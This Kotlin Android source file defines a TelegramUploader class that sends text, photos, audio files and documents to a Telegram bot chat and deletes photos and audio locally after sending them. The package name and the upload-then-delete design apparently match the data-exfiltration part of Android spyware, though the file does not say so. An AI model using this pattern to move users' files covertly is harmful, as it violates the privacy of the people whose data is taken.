package com.systemlinker.features

import com.systemlinker.base.ErrorLogger
import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class TelegramUploader(
    private val context: Context,
    private val botToken: String,
    private val chatId: Long
) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // ... (Keep existing sendText and sendFile functions) ...
    suspend fun sendText(text: String) = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                put("parse_mode", "Markdown")
            }
            val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            ErrorLogger.logError(context, "TelegramUploader_Text", e)
        }
    }

    suspend fun sendFile(file: File, type: String, caption: String = "") = withContext(Dispatchers.IO) {
        try {
            if (!file.exists()) return@withContext
            val endpoint = if (type == "photo") "sendPhoto" else "sendAudio"
            val mediaType = if (type == "photo") "image/jpeg" else "audio/mp4"
            
            val fileBody = file.asRequestBody(mediaType.toMediaTypeOrNull())
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("caption", caption)
                .addFormDataPart(type, file.name, fileBody)
                .build()

            val request = Request.Builder().url("https://api.telegram.org/bot$botToken/$endpoint").post(requestBody).build()
            client.newCall(request).execute().use { file.delete() }
        } catch (e: Exception) {
            ErrorLogger.logError(context, "TelegramUploader_File", e)
            file.delete()
        }
    }

    suspend fun sendDocument(file: File, caption: String = "") = withContext(Dispatchers.IO) {
        try {
            if (!file.exists()) {
                sendText("Requested document does not exist or is empty.")
                return@withContext
            }
            val fileBody = file.asRequestBody("text/plain".toMediaTypeOrNull())
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.name, fileBody)
                .build()

            val request = Request.Builder().url("https://api.telegram.org/bot$botToken/sendDocument").post(requestBody).build()
            client.newCall(request).execute().close() // Do not delete the log file here, let user clear it explicitly
        } catch (e: Exception) {
            ErrorLogger.logError(context, "TelegramUploader_Doc", e)
        }
    }
}